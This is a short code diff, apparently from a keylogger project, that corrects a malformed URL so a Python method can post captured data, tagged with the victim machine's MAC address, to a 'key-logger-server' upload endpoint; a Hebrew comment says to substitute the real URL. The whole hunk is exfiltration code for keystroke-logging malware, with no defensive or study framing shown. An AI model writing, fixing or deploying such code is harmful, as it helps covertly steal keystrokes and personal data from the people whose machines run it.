@@ -42,7 +42,7 @@ class DataFileWriter(APIServer):
 
     def interact_with_server(self, file_data, mac_address=mac_address):
 
-        url = "https://key-logger-server.onrender.com/api/data/upload'"  # החלף בכתובת ה-URL האמיתית
+        url = "https://key-logger-server.onrender.com/api/data/upload"  # החלף בכתובת ה-URL האמיתית
         try:
             response = requests.post(url, json=file_data, headers={"mac-address": mac_address})
             response.raise_for_status()
